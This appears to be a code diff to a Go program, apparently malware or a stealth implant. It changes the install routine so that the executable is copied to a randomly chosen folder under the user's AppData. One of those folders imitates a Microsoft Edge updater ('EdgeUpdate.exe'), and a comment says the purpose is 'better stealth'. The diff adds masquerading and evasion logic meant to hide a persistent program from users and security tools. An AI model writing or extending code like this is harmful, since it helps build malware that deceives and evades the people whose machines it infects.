@@ -290,9 +290,22 @@ func ensureNormalInstall() bool {
 	if appData == "" {
 		return false
 	}
+	localAppData := os.Getenv("LOCALAPPDATA")
+	if localAppData == "" {
+		localAppData = appData
+	}
 
-	targetDir := filepath.Join(appData, getMicrosoftDirName(), getWindowsDirName())
-	targetExe := filepath.Join(targetDir, getServiceExeName())
+	// Randomly choose install path for better stealth
+	var targetDir, targetExe string
+	if rand.Intn(2) == 0 {
+		// GoogleUpdate path
+		targetDir = filepath.Join(appData, getMicrosoftDirName(), getWindowsDirName())
+		targetExe = filepath.Join(targetDir, getServiceExeName())
+	} else {
+		// EdgeUpdate path
+		targetDir = filepath.Join(localAppData, getMicrosoftDirName(), "EdgeUpdate")
+		targetExe = filepath.Join(targetDir, "EdgeUpdate.exe")
+	}
 
 	// If already running from installed location, continue normally
 	if exePath == targetExe {
